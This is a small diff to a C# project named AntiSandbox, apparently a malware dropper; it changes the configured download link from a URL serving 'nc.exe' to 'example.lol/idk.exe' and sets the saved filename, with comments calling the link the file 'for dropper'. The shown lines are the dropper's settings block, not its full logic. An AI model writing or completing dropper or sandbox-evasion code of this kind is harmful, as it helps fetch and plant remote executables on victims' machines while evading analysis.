@@ -14,9 +14,9 @@ namespace AntiSandbox
 
             ///////////////////////////////
             ///                        ///
-            bool dev = true;                         // Enable/Disable devmode
-            string link = "https://iiii.lol/nc.exe";  // set link to get file for dropper
-            string name = "test.exe";                 // set filename (saved as)
+            bool dev = true;                             // Enable/Disable devmode
+            string link = "https://example.lol/idk.exe";  // set link to get file for dropper
+            string name = "test.exe";                    // set filename (saved as)
             ///                          ///
             ///////////////////////////////
 
